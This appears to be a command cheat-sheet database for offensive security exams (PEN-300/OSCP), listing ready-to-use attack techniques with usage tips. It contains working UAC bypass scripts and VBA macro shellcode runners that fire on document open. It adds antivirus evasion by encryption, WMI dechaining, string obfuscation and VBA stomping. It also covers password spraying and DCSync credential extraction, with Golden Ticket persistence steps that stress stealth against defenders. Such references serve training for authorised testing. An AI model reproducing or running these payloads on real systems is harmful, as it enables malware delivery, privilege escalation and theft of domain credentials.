New-ItemProperty -Path ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Name ""DelegateExecute"" -Value """" -Force
Set-ItemProperty -Path ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Name ""(default)"" -Value ""<PAYLOAD_COMMAND>"" -Force

# Trigger UAC bypass
Start-Process ""C:\Windows\System32\fodhelper.exe"" -WindowStyle Hidden

# Cleanup
Start-Sleep -Seconds 3
Remove-Item ""HKCU:\Software\Classes\ms-settings\"" -Recurse -Force","Exploit fodhelper.exe auto-elevation via registry hijacking. Creates HKCU registry key that fodhelper.exe checks, executes payload with high integrity without UAC prompt.","","Syntax:
Execute in PowerShell with medium integrity (standard user) FodHelper is classic UAC bypass for Windows 10.

Works on unpatched systems.

Quick to execute (~10 sec).

Always clean up registry key for stealth.

Test integrity with 'whoami /groups' before and after.

Useful after initial access to escalate without credentials.

Time estimate:
2 minutes References:
docs/av-evasion/uac-bypass.md#fodhelper, PEN-300 Chapter 7.5 Manual alternative:
Use alternate UAC bypasses (eventvwr, sdclt, computerdefaults), exploit vulnerabilities, or request legitimate admin credentials",""
"eventvwr-uac-bypass","EventVwr UAC Bypass","uac-bypass","# Create registry key
New-Item ""HKCU:\Software\Classes\mscfile\shell\open\command"" -Force
Set-ItemProperty -Path ""HKCU:\Software\Classes\mscfile\shell\open\command"" -Name ""(default)"" -Value ""<PAYLOAD_COMMAND>"" -Force

# Trigger UAC bypass
Start-Process ""C:\Windows\System32\eventvwr.exe"" -WindowStyle Hidden

# Cleanup
Start-Sleep -Seconds 3
Remove-Item ""HKCU:\Software\Classes\mscfile\"" -Recurse -Force","Exploit eventvwr.exe auto-elevation via registry hijacking. Similar to FodHelper but uses different registry key (mscfile). Works on Windows 7-10.","","Syntax:
Execute in PowerShell with medium integrity EventVwr is older bypass, may be patched.

FodHelper more reliable on modern systems.

Good backup option.

Works on Windows 7-10.

~5 sec execution time.

Time estimate:
2 minutes References:
docs/av-evasion/uac-bypass.md#eventvwr Manual alternative:
Use FodHelper, sdclt, computerdefaults, or other auto-elevate binaries",""
"check-integrity-level","Check Process Integrity Level","uac-bypass","whoami /groups | findstr /i ""Mandatory Label""","Verify current process integrity level (Low/Medium/High/System). Determines if UAC bypass needed and validates bypass success.","","Syntax:
Run in cmd.exe or PowerShell Always check integrity before attempting UAC bypass.

Medium + Administrators group = UAC bypass will work.

Low integrity = sandboxed process, escape first.

High = already elevated, no bypass needed.

Takes <5 sec to check.

Time estimate:
10 seconds References:
docs/av-evasion/uac-bypass.md#integrity-levels Manual alternative:
Use PowerShell [Security.Principal.WindowsIdentity]::GetCurrent(), Process Explorer, or Task Manager Details pane",""
"uac-bypass-detection","Test UAC Bypass Detection","uac-bypass","# Test registry creation (no trigger)
New-Item ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Force
New-ItemProperty -Path ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Name ""DelegateExecute"" -Value """" -Force
Set-ItemProperty -Path ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Name ""(default)"" -Value ""cmd /c echo test"" -Force

Write-Host ""Registry keys created. Check for AV alerts...""
Start-Sleep 10

# Cleanup
Remove-Item ""HKCU:\Software\Classes\ms-settings\"" -Recurse -Force
Write-Host ""Cleaned up. No AV alert = bypass likely undetected.""","Test if UAC bypass attempt is detected/blocked by AV or EDR. Creates registry keys without triggering bypass to check for alerts.","","Syntax:
Execute in PowerShell to test detection Test before using in real engagement.

Some EDR products specifically monitor HKCU\Software\Classes hijacking.

If detected, try alternate bypasses (sdclt, computerdefaults) or token manipulation.

~30 sec test time.

Time estimate:
30 seconds References:
docs/av-evasion/uac-bypass.md#testing Manual alternative:
Monitor Windows Event Logs (Security, Sysmon), check EDR console, or use Process Monitor to watch registry access",""
"vba-shellcode-runner-basic","VBA Shellcode Runner (Basic)","vba-evasion","Private Declare PtrSafe Function CreateThread Lib ""kernel32"" (ByVal Zopqv As Long, ByVal Mqnlq As Long, ByVal Xxjvx As LongPtr, Zqcxr As Long, ByVal Txyin As Long, Bnkjk As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib ""kernel32"" (ByVal Xaojl As Long, ByVal Hbzvw As Long, ByVal Cwmrq As Long, ByVal Gzpbv As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib ""kernel32"" (ByVal Dkhnw As LongPtr, ByRef Kcaob As Any, ByVal Pauic As Long) As LongPtr

Sub Auto_Open()
    Dim buf As Variant
    buf = Array(<SHELLCODE_BYTES>)
    
    Dim addr As LongPtr
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    Dim counter As Long
    For counter = LBound(buf) To UBound(buf)
        Dim data As Long
        data = buf(counter)
        RtlMoveMemory addr + counter, data, 1
    Next counter
    
    Dim thandle As LongPtr
    thandle = CreateThread(0, 0, addr, 0, 0, 0)
End Sub","Basic VBA macro for executing shellcode in memory. Uses VirtualAlloc → RtlMoveMemory → CreateThread pattern. Foundation for Office-based payloads.","","Syntax:
Add to Word/Excel VBA editor (Alt+F11), insert shellcode bytes Basic runner detected by all modern AV.

Always combine with encryption (Caesar/XOR) and obfuscation.

Auto_Open triggers on document open.

Use AutoOpen() for compatibility.

Time estimate:
5 minutes (with shellcode generation) References:
docs/av-evasion/vba-evasion.md#basic-runner, PEN-300 Chapter 6.7 Manual alternative:
Use PowerShell download cradle from VBA, WMI process creation, or COM object execution",""
"vba-caesar-cipher","VBA Caesar Cipher Shellcode","vba-evasion","' Offline encryption (Python):
# shellcode = [0xfc, 0x48, 0x83, ...]
# key = 2
# encrypted = [(b + key) % 256 for b in shellcode]

' VBA decryption and execution:
Sub AutoOpen()
    Dim buf As Variant
    buf = Array(<ENCRYPTED_BYTES>)  ' Caesar encrypted shellcode
    
    ' Decrypt with Caesar cipher
    For i = LBound(buf) To UBound(buf)
        buf(i) = (buf(i) - <KEY>) Mod 256
    Next i
    
    ' Execute (VirtualAlloc -> RtlMoveMemory -> CreateThread)
    Dim addr As LongPtr
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For i = LBound(buf) To UBound(buf)
        RtlMoveMemory addr + i, buf(i), 1
    Next i
    CreateThread 0, 0, addr, 0, 0, 0
End Sub","Encrypt shellcode with Caesar cipher in VBA. Decrypt at runtime before execution. Simple obfuscation to evade static signatures in Office documents.","","Syntax:
Encrypt offline, paste encrypted bytes into VBA Caesar cipher is weak but better than plaintext.

Key=2 is common in examples.

For exam, consider XOR for better evasion.

Combine with obfuscation and dechaining.

Time estimate:
10 minutes (encryption + integration) References:
docs/av-evasion/vba-evasion.md#caesar-cipher, PEN-300 Chapter 6.7.1 Manual alternative:
Use XOR encryption (stronger), AES encryption, or base64 encoding",""
"vba-wmi-dechain","VBA WMI Process Dechaining","vba-evasion","Sub AutoOpen()
    Dim payload As String
    payload = ""powershell.exe -nop -w hidden -enc <BASE64_PAYLOAD>""
    
    Dim pid As Variant
    GetObject(""winmgmts:"").Get(""Win32_Process"").Create payload, Null, Null, pid
End Sub","Execute payload via WMI to break parent-child process chain. Office doc → WMI → powershell breaks typical macro detection. Payload runs outside Office sandbox.","","Syntax:
Add to VBA macro, replace <BASE64_PAYLOAD> with encoded PowerShell WMI dechaining is powerful evasion technique.

Breaks WINWORD -> powershell parent-child relationship that AV monitors.

Always encode PowerShell with base64.

Test network connectivity first.

Time estimate:
5 minutes References:
docs/av-evasion/vba-evasion.md#wmi-dechaining, PEN-300 Chapter 6.8.2 Manual alternative:
Use WScript.Shell.Run, CreateObject(""WScript.Shell"").Exec, or scheduled task creation",""
"vba-string-obfuscation","VBA String Obfuscation","vba-evasion","' Method 1: String concatenation
Dim cmd As String
cmd = ""power"" & ""shell"" & "".exe""

' Method 2: Chr() function
cmd = Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108)

' Method 3: StrReverse()
cmd = StrReverse(""exe.llehsrewop"")

' Method 4: Replace()
cmd = Replace(""pXwXrshell.exe"", ""X"", ""o"")","Obfuscate suspicious strings (powershell, msfvenom, http) using concatenation and character codes. Evades simple string-based signatures in VBA code.","","Syntax:
Apply to suspicious strings in VBA code String obfuscation is quick win (~10 min).

Always obfuscate 'powershell', 'cmd', 'http', 'IEX', 'msfvenom'.

Use random variable names (avoid shellcode, payload, etc.).

Combine all methods for best results.

Time estimate:
10 minutes References:
docs/av-evasion/vba-evasion.md#obfuscation, PEN-300 Chapter 6.8.3 Manual alternative:
Use variable substitution, encoded strings, or external data sources (document properties, hidden cells)",""
"vba-stomping","VBA Stomping (P-Code Manipulation)","vba-evasion","# VBA stomping workflow:
# 1. Create malicious VBA macro in Office document
# 2. Save as .doc (legacy format required for stomping)
# 3. Use EvilClippy to stomp VBA source:
EvilClippy.exe -s <INPUT_DOC> -o <OUTPUT_DOC>

# Manual method:
# 1. Open .doc in hex editor
# 2. Locate VBA source code section
# 3. Replace with garbage/nulls while preserving p-code
# 4. Save and test","Remove VBA source code while preserving compiled p-code. Office executes p-code even if source removed. Analysis tools see empty/garbage VBA, can't analyze logic.","","Syntax:
Use EvilClippy tool or manual hex editing Advanced technique, requires EvilClippy tool.

Extremely effective against static analysis and sandboxes.

Only works on .doc (not .docx).

Test macro BEFORE stomping - can't debug after.

Save original.

Practice on lab before exam.

Time estimate:
15 minutes (with EvilClippy) References:
docs/av-evasion/vba-evasion.md#vba-stomping, https://github.com/outflanknl/EvilClippy, PEN-300 Chapter 6.7.2 Manual alternative:
Use OfficeMalScanner, olevba, or manual p-code analysis/manipulation",""
"vba-autoopen-variants","VBA Auto-Execution Methods","vba-evasion","' Method 1: Auto_Open (Word/Excel - legacy)
Sub Auto_Open()
    ' Your payload
End Sub

' Method 2: AutoOpen (Word - no underscore)
Sub AutoOpen()
    ' Your payload
End Sub

' Method 3: Document_Open (Word - modern)
Private Sub Document_Open()
    ' Your payload
End Sub

' Method 4: Workbook_Open (Excel)
Private Sub Workbook_Open()
    ' Your payload
End Sub

' Method 5: AutoExec (Word - on close)
Sub AutoExec()
    ' Your payload
End Sub","Various methods to trigger VBA macro execution automatically. Auto_Open, AutoOpen, Document_Open, Workbook_Open for different Office versions and scenarios.","","Syntax:
Choose appropriate method for Office version and app Always implement Auto_Open AND AutoOpen for Word (compatibility).

Excel uses Workbook_Open.

Test on target Office version if known.

Social engineering required to convince user to enable macros.

Time estimate:
2 minutes References:
docs/av-evasion/vba-evasion.md#auto-execution Manual alternative:
Use ActiveX controls, form events, or button click handlers for user-initiated execution",""
"import-powerview","Import PowerView Module","enumeration","Import-Module <PATH>\PowerView.ps1","Load PowerView module into PowerShell session to enable Active Directory enumeration cmdlets. PowerView is a PowerShell tool for gaining network situational awareness on Windows domains. This must be run before any PowerView cmdlets can be used.","","PowerView.ps1 may trigger AV detection.

Consider using obfuscated versions or AMSI bypass techniques.

For OSCP, usually safe on target machines.

Alternative:
Use native AD cmdlets if PowerView unavailable.","high"
"get-netdomain","Get Domain Information","enumeration","Get-NetDomain","Retrieve detailed information about the current domain or specified domain. Returns domain name, domain controllers, forest name, and other critical AD infrastructure details. Essential for understanding the target AD environment structure.","","The DomainSID is particularly valuable - save it for potential Golden/Silver Ticket attacks.

For OSCP, focus on identifying Domain Controllers and understanding domain structure.

Manual alternative:
'nltest /dclist:<domain>'","high"
"get-netuser","Enumerate Domain Users","enumeration","Get-NetUser -SamAccountName <USERNAME>","Query Active Directory for user account details including account properties, group memberships, login times, and password policies. Can enumerate all users or target specific accounts. Critical for identifying privileged accounts and attack targets.","","OSCP Tip:
Always check user 'description' field - admins often store passwords there.

Use '-AdminCount 1' to quickly find privileged accounts.

For Kerberoasting, look for serviceprincipalname field.

Manual alternative:
'net user /domain' or 'net user <username> /domain'","high"
"get-netgroup","Enumerate Domain Groups","enumeration","Get-NetGroup -GroupName ""<GROUP>""","Query Active Directory for group information and group memberships. Identifies privileged groups like Domain Admins, Enterprise Admins, and custom administrative groups. Essential for privilege escalation path mapping.","","OSCP Focus Groups:
'Domain Admins', 'Enterprise Admins', 'Backup Operators', 'Account Operators', 'Server Operators'.

These groups have elevated privileges.

Use Get-NetGroupMember to see full membership recursively.

Manual alternative:
'net group ""<group>"" /domain'","high"
"get-netcomputer","Enumerate Domain Computers","enumeration","Get-NetComputer -FullData","Query Active Directory for computer objects including workstations, servers, and domain controllers. Returns detailed information about each computer including OS version, last logon, and DNS hostname. Critical for identifying high-value targets and lateral movement candidates.","","OSCP Strategy:
Focus on servers (OperatingSystem like '*Server*') as they often have more privileges.

Look for SQL servers, Exchange, domain controllers.

Use -Unconstrained flag to find computers vulnerable to delegation attacks.

Manual alternative:
'net view' for basic computer list.","high"
"find-localadminaccess","Find Local Admin Access","enumeration","Find-LocalAdminAccess","Test current user's local administrator access on all domain computers by attempting to access admin shares (C$). Identifies systems where current user has local admin rights, critical for lateral movement and privilege escalation path discovery.","","OSCP Critical:
This identifies WHERE you can move laterally.

Results show systems where PSExec, WMI, or PowerShell Remoting will work.

Can be slow on large domains - use -ComputerName with high-value targets list.

Generates SMB traffic that may be logged.

Manual alternative:
Test C$ access manually with 'dir \\<computer>\C$'","high"
"invoke-sharefinder","Find Network Shares","enumeration","Invoke-ShareFinder","Enumerate all accessible network shares across domain computers. Identifies potential data repositories, file servers, and misconfigurations. Critical for finding sensitive files, configuration files, and credentials stored in shares.","","OSCP Priority Shares:
SYSVOL (Group Policy files often contain credentials), NETLOGON (logon scripts), custom shares (user data).

Look for passwords in files like Groups.xml (Group Policy Preferences), scripts, config files.

Manual alternative:
'net view \\<computer>' to list shares.","medium"
"get-netgpo","Enumerate Group Policy Objects","enumeration","Get-NetGPO","Query Active Directory for Group Policy Objects (GPOs) and their configurations. GPOs often contain credentials, scheduled tasks, registry settings, and other useful information for privilege escalation and lateral movement.","","OSCP Gold Mine:
Look for Groups.xml in GPO SYSVOL paths - contains cpassword (encrypted passwords).

Use gpp-decrypt to decrypt.

Also check Scripts folder for logon/startup scripts that may contain credentials.

Manual path:
\\domain\SYSVOL\domain\Policies\{GUID}\","medium"
"get-domainsid","Get Domain Security Identifier","enumeration","Get-DomainSID","Retrieve the Security Identifier (SID) for the current or specified domain. Domain SID is required for advanced attacks like Golden Ticket and Silver Ticket attacks. Essential component for Kerberos ticket forgery.","","OSCP Critical for Golden Tickets:
Combine Domain SID + krbtgt hash + domain name to create Golden Ticket.

For user SID, append RID (500 for Administrator, 512 for Domain Admins group).

Manual alternative:
'whoami /user' shows current user's SID, remove last segment for domain SID.

Or 'wmic useraccount get name,sid'","medium"
"invoke-bloodhound","Run BloodHound Collector","enumeration","Invoke-BloodHound -CollectionMethod All","Execute BloodHound data collector (SharpHound) to gather comprehensive Active Directory relationship data. Collects user sessions, group memberships, ACLs, trusts, and other relationships for graph analysis. Outputs JSON files for import into BloodHound GUI.","","OSCP Essential:
BloodHound visualizes attack paths you'd have to manually map otherwise.

Focus on 'Shortest Paths to Domain Admins' and 'Kerberoastable Accounts' queries.

Session collection is noisy (touches every computer).

Can run from Linux with bloodhound-python.

Transfer ZIP to attacker machine with BloodHound GUI for analysis.","high"
"kerbrute-userenum-ad","Kerbrute - Active Directory User Enumeration","enumeration","kerbrute userenum -d <DOMAIN> --dc <DC_IP> <USERLIST>","Enumerate valid AD usernames via Kerberos pre-authentication (AS-REQ) - extremely fast and stealthy","active-directory","FASTEST and MOST STEALTHY user enumeration method for AD.

Uses Kerberos pre-authentication (AS-REQ) to validate usernames.

NOISE LEVEL:
Very Low - only generates event ID 4768 (Kerberos TGT request) for valid users, which is normal traffic.

Invalid usernames don't generate security logs.

SPEED:
Can test thousands of usernames per second.

WHY THIS WORKS:
When you request a TGT for a username, Kerberos responds differently for valid vs invalid users.

Valid users get 'PREAUTH_REQUIRED' error, invalid users get 'PRINCIPAL_UNKNOWN'.

This is by-design behavior, not a vulnerability.

TIME ESTIMATE:
10-60 seconds for 10k usernames.

RECOMMENDED WORDLISTS:
/usr/share/seclists/Usernames/Names/names.txt (common first names), /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt (comprehensive).

OSCP TIP:
Run this BEFORE password spraying to build valid username list.

No credentials needed! Save output with -o flag:
kerbrute userenum -d <DOMAIN> --dc <DC_IP> <USERLIST> -o valid_users.txt","high"
"crackmapexec-rid-cycling","CrackMapExec - RID Cycling User Enumeration","enumeration","crackmapexec smb <TARGET> -u <USERNAME> -p <PASSWORD> --rid-brute","Enumerate domain users via RID cycling over SMB (requires NULL session or credentials)","active-directory","TRADITIONAL user enumeration via RID cycling.

RIDs (Relative Identifiers) are sequential numbers assigned to AD objects.

By querying RID 500, 501, 502...

you can enumerate users, groups, computers.

REQUIRES:
NULL session or valid credentials.

NOISE LEVEL:
High - SMB connections logged, many failed SID lookups generate events.

WHY THIS WORKS:
Windows exposes SID-to-name translation via MS-SAMR RPC over SMB.

RIDs follow pattern:
Domain SID + RID (e.g., S-1-5-21-[domain]-500 for Administrator).

SLOWER than Kerbrute but works when Kerberos port filtered.

TIME ESTIMATE:
1-3 minutes for default range.

MANUAL ALTERNATIVE:
rpcclient -U '' -N <TARGET> then lookupsids S-1-5-21-[domain]-[RID].

OSCP TIP:
Prefer kerbrute-userenum-ad when possible (faster, stealthier).

Use RID cycling when SMB is accessible but Kerberos is blocked, or when you want to enumerate groups/computers too (not just users).","medium"
"ldapsearch-users-ad","ldapsearch - LDAP User Enumeration","enumeration","ldapsearch -x -H ldap://<TARGET> -b '<DOMAIN_DN>' '(&(objectClass=user)(objectCategory=person))' sAMAccountName userPrincipalName","Enumerate Active Directory users via LDAP queries (anonymous or authenticated)","active-directory","COMPREHENSIVE user enumeration via LDAP.

Retrieves ALL user objects from Active Directory.

May work ANONYMOUSLY if anonymous LDAP binding enabled (rare in modern domains).

NOISE LEVEL:
Low - LDAP queries often not logged.

ADVANTAGES:
Gets full user list in single query, can retrieve additional attributes (description, memberOf, pwdLastSet).

WHY THIS WORKS:
AD exposes user objects via LDAP, readable by authenticated users (sometimes anonymous).

TIME ESTIMATE:
5-15 seconds.

OUTPUT PARSING:
Extract usernames with grep/awk:
ldapsearch ...

| grep 'sAMAccountName:' | awk '{print $2}' > users.txt.

USEFUL FILTERS:
Non-disabled users:
'(&(objectClass=user)(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))'.

Users with no password expiry:
'(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))'.

OSCP TIP:
Try anonymous bind first.

If blocked, use any valid credentials.

Combine with kerbrute to validate enumerated users before spraying.","medium"
"enum4linux-users-ad","Enum4linux - SMB User Enumeration","enumeration","enum4linux -U <TARGET>","Enumerate Active Directory users via SMB/RPC (supports null sessions and authenticated)","active-directory","CLASSIC user enumeration tool for Windows/AD environments.

Uses MS-SAMR RPC over SMB to enumerate users.

Often works via NULL SESSION on older systems.

NOISE LEVEL:
Medium - SMB connections logged.

LIMITATIONS:
Requires SMBv1 or null sessions (both often disabled on modern domains).

ADVANTAGES:
Gets users, groups, shares, and password policy in one command (-a flag).

WHY THIS WORKS:
Windows exposes user enumeration via SAMR RPC for backward compatibility.

TIME ESTIMATE:
15-45 seconds.

OUTPUT PARSING:
Extract usernames:
enum4linux -U <TARGET> | grep 'user:' | awk -F'[][]' '{print $2}'.

OSCP TIP:
Great for quick all-in-one enumeration (enum4linux -a) but less reliable on modern domains than kerbrute.

Use enum4linux first for broad recon, then kerbrute for targeted username validation.","medium"
"spray-passwords-ldap","Spray-Passwords.ps1 - LDAP Password Spraying","password-attacks","powershell -ep bypass -c ""C:\Tools\Spray-Passwords.ps1 -Pass <PASSWORD> -Admin""","PowerShell script for low-and-slow Active Directory password spraying via LDAP/DirectoryEntry (policy-aware)","active-directory","LOW-AND-SLOW password spraying method using PowerShell DirectoryEntry LDAP authentication.

AUTOMATICALLY reads domain password policy and respects lockout threshold.

NOISE LEVEL:
Very Low - only generates standard authentication events (Event ID 4776), appears as normal login attempts.

SPEED:
Slow (1-2 attempts per second) but STEALTHY.

WHY THIS WORKS:
DirectoryEntry constructor accepts three arguments (LDAP path, username, password).

If credentials are valid, object creation succeeds.

If invalid, exception is thrown.

Script enumerates all domain users via LDAP and attempts authentication for each user with the supplied password.

ADVANTAGES:
Policy-aware (won't lock out accounts), generates minimal network traffic, looks like normal user logins.

TIME ESTIMATE:
2-5 minutes for 100 users.

MANUAL ALTERNATIVE:
PowerShell one-liner:
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain(); $PDC = ($domainObj.PdcRoleOwner).Name; $dn = 'DC=' + ($domainObj.Name -replace '\.',',DC='); $ldap = ""LDAP://$PDC/$dn""; New-Object System.DirectoryServices.DirectoryEntry($ldap, 'username', 'password').

If successful, returns distinguishedName and Path properties.

OSCP TIP:
Use this method when you have access to a domain-joined Windows system.

Run from PowerShell as logged-in domain user.

Script is at C:\Tools\Spray-Passwords.ps1 on many lab systems.

Source:
https://github.com/ZilentJack/Spray-Passwords","high"
"crackmapexec-smb-spray","CrackMapExec - SMB Password Spraying","password-attacks","crackmapexec smb <TARGET> -u <USERLIST> -p '<PASSWORD>' -d <DOMAIN> --continue-on-success","SMB-based password spraying with CrackMapExec (noisy but shows admin rights with Pwn3d! indicator)","active-directory","TRADITIONAL password spraying via SMB.

NOISY but provides BONUS FEATURE:
Pwn3d! indicator shows when credentials have LOCAL ADMIN rights on target system.

NOISE LEVEL:
High - each attempt creates full SMB connection, generates Event ID 4625 (failed logon) for wrong passwords, Event ID 4624 (successful logon) for valid credentials.

NETWORK TRAFFIC:
High - full SMB session setup/teardown for each attempt.

SPEED:
Slow (1 attempt per second).

WHY THIS WORKS:
CrackMapExec establishes SMB connection and attempts NTLM authentication.

Success/failure determined by STATUS code.

Local admin rights detected by attempting to list shares or access IPC$.

CRITICAL WARNING:
CrackMapExec does NOT respect password policy or check lockout threshold.

YOU must manually ensure you don't exceed lockout threshold (use 4 attempts max if threshold is 5, then wait for observation window).

TIME ESTIMATE:
1-3 minutes for 20 users.

RECOMMENDED USAGE:
Use after getting password policy (crackmapexec-policy) and calculating safe spray count.

Example calculation:
5 lockout threshold, 30min observation window = spray 4 passwords max, wait 30min, repeat.

OSCP TIP:
Despite being noisy, this is valuable for identifying admin rights immediately.

Use for final validation after finding credentials with quieter methods.

Create users.txt with one username per line first.","high"
"kerbrute-passwordspray","Kerbrute - Kerberos Password Spraying","password-attacks","kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> <USERLIST> '<PASSWORD>'","Ultra-fast and stealthy password spraying via Kerberos pre-authentication (only 2 UDP packets per attempt)","active-directory","FASTEST and STEALTHIEST password spraying method.

Uses Kerberos AS-REQ (TGT request) to test credentials.

ONLY 2 UDP PACKETS per attempt (AS-REQ and AS-REP).

NOISE LEVEL:
Minimal - only generates Event ID 4768 (TGT request) for valid credentials, Event ID 4771 (pre-auth failure) for wrong passwords.

These events are NORMAL domain traffic and rarely monitored.

SPEED:
Extremely fast - hundreds of attempts per second possible.

NETWORK TRAFFIC:
Minimal - 2 small UDP packets (typically <500 bytes total).

WHY THIS WORKS:
Kerberos pre-authentication requires encrypted timestamp using user's password hash.

If password is correct, KDC responds with TGT.

If wrong, KDC responds with PREAUTH_FAILED.

This is by-design Kerberos behavior.

ADVANTAGES:
No SMB connection needed, works remotely without network access to domain resources (only need UDP 88 to DC), no full authentication = stealthier.

TIME ESTIMATE:
10-30 seconds for 100 users.

CRITICAL:
Does NOT check password policy.

You must calculate safe attempts manually.

Example:
5 lockout threshold = spray 4 passwords max per user, wait 30min (observation window), repeat.

OSCP TIP:
Preferred method for password spraying when you can reach DC on UDP 88.

Use kerbrute userenum first to build valid username list, then spray.

Save results:
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> <USERLIST> '<PASSWORD>' -o valid_creds.txt.

Can be run from Windows or Linux.","high"
"crackmapexec-winrm-spray","CrackMapExec - WinRM Password Spraying","password-attacks","crackmapexec winrm <TARGET> -u <USERLIST> -p '<PASSWORD>' -d <DOMAIN>","WinRM-based password spraying to identify credentials with remote PowerShell access","active-directory","SPECIALIZED password spraying for WinRM access.

Tests if credentials have remote PowerShell access (user in Remote Management Users group or local admin).

NOISE LEVEL:
Medium-High - WinRM authentication attempts logged (Event ID 4625 for failures, 4624 for success).

PORT REQUIREMENTS:
TCP 5985 (HTTP) or 5986 (HTTPS).

WHY THIS WORKS:
CrackMapExec establishes WinRM connection and attempts authentication.

Pwn3d! indicator shows when user has remote management rights.

ADVANTAGES:
Directly identifies credentials that can be used with evil-winrm or Enter-PSSession for remote PowerShell access.

SPEED:
Medium (2-3 seconds per attempt).

TIME ESTIMATE:
2-4 minutes for 20 users.

USE CASE:
When you specifically want remote PowerShell access rather than SMB.

WinRM is increasingly common on modern Windows environments (default enabled on servers).

OSCP TIP:
WinRM is often enabled on Windows Server targets.

If you find valid credentials via this method, immediately try evil-winrm for interactive PowerShell shell:
evil-winrm -i <TARGET> -u <USER> -p '<PASSWORD>'.

Does NOT check password policy - calculate safe attempts manually.","high"
"ad-dcsync-mimikatz-user","DCSync Specific User with Mimikatz","post-exploit","mimikatz # lsadump::dcsync /user:<DOMAIN>\<USERNAME>","Extract password hash of a specific domain user by impersonating a domain controller. Uses Directory Replication Service (DRS) protocol to request credentials remotely. PRIMARY method for obtaining krbtgt hash for Golden Ticket attacks.","active-directory","DCSync is PREFERRED over LSA dumping because it's remote (no code execution on DC needed) and uses legitimate AD replication protocols. CRITICAL for OSCP: Always DCSync krbtgt FIRST to enable Golden Ticket attacks. The krbtgt hash rarely changes (only during domain functional level upgrades), providing persistent domain access. Example output parsing: Look for 'Hash NTLM:' line, copy the 32-character hex hash. Save to file for Hashcat cracking: echo [hash] > hashes.txt. Time estimate: 10-30 seconds for single user extraction.

MANUAL ALTERNATIVES:
Specify domain controller explicitly:
mimikatz # lsadump::dcsync /user:corp\krbtgt /domain:corp.com /dc:DC1.corp.com

Dump with password history:
mimikatz # lsadump::dcsync /user:corp\Administrator /history

PowerShell alternative (requires Invoke-Mimikatz):
Invoke-Mimikatz -Command '""lsadump::dcsync /user:corp\krbtgt""'

Impacket (Linux - RECOMMENDED for OSCP):
impacket-secretsdump -just-dc-user krbtgt 'corp.com/jeffadmin:""BrouhahaTungPerorateBroom2023!""@192.168.50.70'

Hash extraction:
mimikatz # lsadump::dcsync /user:corp\dave | findstr ""NTLM""

TIME ESTIMATE: 10-30 seconds (single user extraction)","high"
"ad-dcsync-mimikatz-krbtgt","DCSync krbtgt for Golden Ticket","post-exploit","mimikatz # lsadump::dcsync /user:<DOMAIN>\krbtgt","Extract the krbtgt account hash - THE most critical credential in Active Directory. Used for creating Golden Tickets that grant domain-wide administrative access. krbtgt password rarely changes, providing long-term persistence.","active-directory","ALWAYS extract krbtgt when you achieve Domain Admin access. This is your insurance policy - even if defenders change all passwords, the krbtgt hash remains valid (they rarely rotate it). OSCP EXAM TIP: After getting DA, immediately DCSync krbtgt and save the hash externally. If you lose access or session dies, you can create Golden Ticket for re-entry. The krbtgt account has TWO password hashes stored (current and previous) - use the 'Hash NTLM:' line (current hash). Time estimate: 10-30 seconds.

MANUAL ALTERNATIVES:
With explicit domain:
mimikatz # lsadump::dcsync /user:corp.com\krbtgt /domain:corp.com

Extract both NTLM and AES keys:
mimikatz # lsadump::dcsync /user:corp\krbtgt /csv

Impacket (Linux - RECOMMENDED):
impacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@192.168.50.70'

PowerShell:
Invoke-Mimikatz -Command '""lsadump::dcsync /user:corp\krbtgt""' | Out-File krbtgt.txt

Parse hash only:
mimikatz # lsadump::dcsync /user:corp\krbtgt | findstr ""Hash NTLM"" | Select-String -Pattern ""[a-f0-9]{32}""

TIME ESTIMATE: 10-30 seconds

NEXT STEP: Save this hash immediately! You need it + Domain SID + Domain FQDN for Golden Ticket:
1. Copy NTLM hash: [32 hex chars]
2. Get Domain SID: whoami /user (remove user RID)
3. Get Domain FQDN: echo %USERDNSDOMAIN%
4. Create Golden Ticket: kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-XXX /krbtgt:[HASH] /ptt","high"
"ad-dcsync-mimikatz-administrator","DCSync Administrator Account","post-exploit","mimikatz # lsadump::dcsync /user:<DOMAIN>\Administrator","Extract the domain Administrator account hash (RID 500). High-value target for lateral movement and privilege escalation. Often has simple passwords in legacy environments.","active-directory","Administrator hash is useful for immediate lateral movement (Pass-the-Hash) or password cracking. Unlike krbtgt (service account), Administrator can authenticate directly via NTLM/Kerberos. OSCP TIP: If Administrator password is complex, use the hash directly with Pass-the-Hash (psexec.py, wmiexec.py, evil-winrm). Start Hashcat cracking in background while using PTH for time efficiency. The built-in Administrator account CANNOT be locked out, making it safe for password spraying if you don't have hash yet. Time estimate: 10-30 seconds.

MANUAL ALTERNATIVES:
DCSync with password history:
mimikatz # lsadump::dcsync /user:corp\Administrator /history

Find renamed Administrator:
Get-ADUser -Filter 'SID -like ""*-500""' | Select Name, SamAccountName

Impacket:
impacket-secretsdump -just-dc-user Administrator 'corp.com/admin:pass@192.168.50.70'

DCSync if renamed (example: AdminDA):
mimikatz # lsadump::dcsync /user:corp\AdminDA

Extract and crack immediately:
mimikatz # lsadump::dcsync /user:corp\Administrator | findstr ""Hash NTLM"" > admin_hash.txt
hashcat -m 1000 admin_hash.txt rockyou.txt -r best64.rule

TIME ESTIMATE: 10-30 seconds (extraction only), 1-60+ minutes (cracking, depends on password complexity)","high"
